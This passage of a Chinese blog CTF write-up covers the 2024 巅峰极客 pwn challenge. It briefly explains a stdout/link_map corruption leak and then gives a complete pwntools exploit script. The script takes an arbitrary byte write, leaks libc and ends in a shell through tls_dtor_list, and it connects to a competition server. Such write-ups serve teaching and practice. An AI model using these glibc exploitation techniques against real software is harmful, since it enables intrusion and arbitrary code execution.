<span class="hljs-comment">#_IO_write_ptr</span><br>lss(<span class="hljs-string">&#x27;link_map&#x27;</span>)<br><br><span class="hljs-comment"># dbg(&#x27;b *$rebase(0x01219)&#x27;)</span><br>write_all(ld_base+ld.symbols[<span class="hljs-string">&#x27;_r_debug&#x27;</span>]+<span class="hljs-number">0x3e</span>,b<span class="hljs-string">&#x27;_IO_flush_all\x00&#x27;</span>)<br><br>dbg(<span class="hljs-string">&#x27;b *$rebase(0x01219)&#x27;</span>)<br><span class="hljs-built_in">write</span>(link_map + <span class="hljs-number">0x40</span>+<span class="hljs-number">5</span>*<span class="hljs-number">0x8</span>, <span class="hljs-number">0xb8</span>) <span class="hljs-comment"># start flush</span><br><span class="hljs-built_in">write</span>(link_map + <span class="hljs-number">0x40</span>+<span class="hljs-number">5</span>*<span class="hljs-number">0x8</span>, <span class="hljs-number">0x78</span>) <span class="hljs-comment"># stop flush</span><br><br>write_all(<span class="hljs-keyword">stdout</span>,p32(<span class="hljs-number">0xfbad1800</span>))   <span class="hljs-comment">#_flags</span><br>write_all(<span class="hljs-keyword">stdout</span>+<span class="hljs-number">0x28</span>,b<span class="hljs-string">&#x27;\xff&#x27;</span>)  <span class="hljs-comment">#_IO_write_ptr</span><br></code></pre></td></tr></table></figure>

<p>​	这里先修改stdout中的数据，先打上标记，至于为何这么做呢，且看</p>
<img src="/2024/08/18/2024%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/16.png" srcset="/img/loading.gif" lazyload class="">

<p>​	因为不先刷新一次的话，这里是不会存在libc的地址，就导致我们无法只能通过修改一个字节来达到泄露地址的目的，得先将flags值和_IO_write_ptr改了后才能将libc的地址挂下，至于为何这么做，请看源码</p>


<p>​	为了满足这些条件</p>


<p>​	之后将libc地址挂上后就直接修改就好了，之后的内容就多样性了，由于我们以及知道如何修改字符串来调用相关函数，那我们就可以通过修改来使_Exit来执行各种函数，由于不能控制rdi，那就可以控制其为exit走IO等能劫持shell的函数即可，这里我就不多描述了，有了libc基地址和地址任意改的能力，这不随便秒，我这里最后走的是tls_dtor_list，别问为啥不走house of cat，问就是我懒，走这个可以少打点代码</p>
<p>最终exp如下，下班</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-comment">#import ctf_pb2</span><br><br>c = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-comment"># srop :    frame = SigreturnFrame()</span><br><span class="hljs-comment"># fmt :        fmtstr_payload(offset=7,writes=&#123;0x4031E0:0x0401445,0x403410:0x401445&#125;,numbwritten=((14*2)+1),write_size=&#x27;short&#x27;)</span><br><br>s    =    <span class="hljs-keyword">lambda</span> a              :pw.send(a)<br>sl   =    <span class="hljs-keyword">lambda</span> a              :pw.sendline(a)<br>sa   =    <span class="hljs-keyword">lambda</span> a,b            :pw.sendafter(a,b)<br>sla  =    <span class="hljs-keyword">lambda</span> a,b            :pw.sendlineafter(a,b)<br>r    =    <span class="hljs-keyword">lambda</span> a=<span class="hljs-number">6666</span>         :pw.recv(a)<br>rl   =    <span class="hljs-keyword">lambda</span>                :pw.recvline()<br>ru   =    <span class="hljs-keyword">lambda</span> a,b=<span class="hljs-literal">True</span>       :pw.recvuntil(a,b)<br>g64  =    <span class="hljs-keyword">lambda</span>                :u64(pw.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>g32  =    <span class="hljs-keyword">lambda</span>                :u32(pw.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gl   =    <span class="hljs-keyword">lambda</span> a              :u64(pw.recvuntil(a,drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>gc   =    <span class="hljs-keyword">lambda</span> a              :u64(pw.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>pwpw =    <span class="hljs-keyword">lambda</span>                :pw.interactive()<br>lss  =    <span class="hljs-keyword">lambda</span> s :log.success(<span class="hljs-string">&#x27;\033[1;31;40m%s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>cal  =    <span class="hljs-keyword">lambda</span> a,b            :((a - b) + <span class="hljs-number">0x10000</span>) % <span class="hljs-number">0x10000</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sb</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>], libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>], libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>], libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>():<br>    libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts)<br>    libc_base = puts - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>    system = libc.dump(<span class="hljs-string">&quot;system&quot;</span>) + libc_base<br>    binsh = libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>) + libc_base<br>    <span class="hljs-keyword">return</span> system,binsh<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">a=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> a !=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(pw,a) <br>        pause()<br>    <span class="hljs-keyword">else</span>:<br>        gdb.attach(pw)  <br>        pause()<br>  <br><span class="hljs-comment"># context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="hljs-comment"># context.arch=&#x27;i386&#x27;</span><br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span> ,<span class="hljs-string">&quot;split&quot;</span> ,<span class="hljs-string">&quot;-h&quot;</span>]<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>file = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(file)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)  <br>ld = ELF(<span class="hljs-string">&#x27;./ld-2.31.so&#x27;</span>)  <br><span class="hljs-comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">0</span>:<br>    pw = process(file)<br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:<br>    pw = remote(<span class="hljs-string">&quot;39.106.48.123&quot;</span>,<span class="hljs-number">29572</span>)<br><span class="hljs-keyword">if</span> debug == <span class="hljs-number">2</span>:<br>    gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        set debug-file-directory /home/pwn_tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/.debug/</span><br><span class="hljs-string">        b exit</span><br><span class="hljs-string">        continue</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    pw = gdb.debug(file, gdbscript=gdbscript)<br><br><span class="hljs-comment">#----------------------------------------------------------------------</span><br>libc_base = <span class="hljs-number">0x40ff0</span><br>ld_base = <span class="hljs-number">0x234ff0</span><br>link_map = <span class="hljs-number">0x264180</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">offset,text</span>):<br>    s(p64(offset))<br>    s(p8(text))<br>    <span class="hljs-keyword">try</span>:<br>        pw.recvuntil(<span class="hljs-string">&quot;HELLO WORLD\x00&quot;</span>,timeout=<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_all</span>(<span class="hljs-params">offset,text</span>):<br>    <span class="hljs-keyword">for</span> i,byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(text):<br>        s(p64(offset+i))<br>        s(p8(byte))<br>        pw.recvuntil(<span class="hljs-string">&quot;HELLO WORLD\x00&quot;</span>,timeout=<span class="hljs-number">1</span>)<br><br>l_addr_offset = elf.got[<span class="hljs-string">&#x27;_Exit&#x27;</span>] - elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write(link_map,l_addr_offset)<br><br>stdout = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>lss(<span class="hljs-string">&#x27;stdout&#x27;</span>)<br><br>write_all(stdout,p32(<span class="hljs-number">0xfbad3887</span>))   <span class="hljs-comment">#_flags</span><br>write_all(stdout+<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x0f&#x27;</span>)  <span class="hljs-comment">#_IO_write_ptr</span><br>lss(<span class="hljs-string">&#x27;link_map&#x27;</span>)<br><br><span class="hljs-comment"># dbg(&#x27;b *$rebase(0x01219)&#x27;)</span><br>write_all(ld_base+ld.symbols[<span class="hljs-string">&#x27;_r_debug&#x27;</span>]+<span class="hljs-number">0x3e</span>,<span class="hljs-string">b&#x27;_IO_flush_all\x00&#x27;</span>)<br><br><span class="hljs-comment"># dbg(&#x27;b *$rebase(0x01219)&#x27;)</span><br>write(link_map + <span class="hljs-number">0x40</span>+<span class="hljs-number">5</span>*<span class="hljs-number">0x8</span>, <span class="hljs-number">0xb8</span>) <span class="hljs-comment"># start flush</span><br>write(link_map + <span class="hljs-number">0x40</span>+<span class="hljs-number">5</span>*<span class="hljs-number">0x8</span>, <span class="hljs-number">0x78</span>) <span class="hljs-comment"># stop flush</span><br><br><span class="hljs-comment"># dbg(&#x27;b *$rebase(0x01219)&#x27;)</span><br>write_all(stdout,p32(<span class="hljs-number">0xfbad1800</span>))   <span class="hljs-comment">#_flags</span><br>write_all(stdout+<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\xff&#x27;</span>)  <span class="hljs-comment">#_IO_write_ptr</span><br><br><span class="hljs-comment"># dbg(&#x27;b *$rebase(0x01219)&#x27;)</span><br>write(link_map + <span class="hljs-number">0x40</span>+<span class="hljs-number">5</span>*<span class="hljs-number">0x8</span>, <span class="hljs-number">0xb8</span>) <span class="hljs-comment"># start flush</span><br>pw.recv(<span class="hljs-number">5</span>)<br>base = u64(pw.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1ee7e0</span><br>lss(<span class="hljs-string">&#x27;base&#x27;</span>)<br>write(link_map + <span class="hljs-number">0x40</span>+<span class="hljs-number">5</span>*<span class="hljs-number">0x8</span>, <span class="hljs-number">0x78</span>) <span class="hljs-comment"># stop flush</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rol</span>(<span class="hljs-params">num,i</span>):<br>    part1 = num &lt;&lt; i<br>    part1 &amp;= (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">64</span>) - <span class="hljs-number">1</span><br>    part2 = num &gt;&gt; (<span class="hljs-number">64</span>- i)<br>    <span class="hljs-keyword">return</span> part1 + part2<br><br>system,binsh = sb(base)<br><br>system = rol(system,<span class="hljs-number">0x11</span>)<br><br>rax = <span class="hljs-number">0x22ec90</span><br>rdi = rax+<span class="hljs-number">0x20</span><br>rdx = rax+<span class="hljs-number">0x18</span><br>fs_30 = <span class="hljs-number">0x2345a0</span><br>write_all(rdi,p64(binsh))<br>write_all(rdx,p64(system))<br><br>write_all(fs_30,p64(<span class="hljs-number">0</span>))<br><br>write_all(ld_base+ld.symbols[<span class="hljs-string">&#x27;_r_debug&#x27;</span>]+<span class="hljs-number">0x3e</span>,<span class="hljs-string">b&#x27;exit\x00&#x27;</span>)<br><span class="hljs-comment"># dbg(&#x27;b *$rebase(0x01219)&#x27;)</span><br>write(link_map + <span class="hljs-number">0x40</span>+<span class="hljs-number">5</span>*<span class="hljs-number">0x8</span>, <span class="hljs-number">0xb8</span>)<br><span class="hljs-comment"># write(0,0)</span><br><br><br><br><br>pwpw()<br></code></pre></td></tr></table></figure>

<p>p _rtld_global</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>2024极客巅峰pwn</div>
      <div>http://example.com/2024/08/18/2024巅峰极客/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>pw</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年8月18日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/08/13/D-link(CVE-2022-26258)/" title="CVE-2022-26258复现">
                        <span class="hidden-mobile">CVE-2022-26258复现</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"y2JhJN2Q6Bvhk7i3zBmRYZkn-gzGzoHsz","appKey":"NSFQG1YUdY6huW8XwmlgXGLG","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
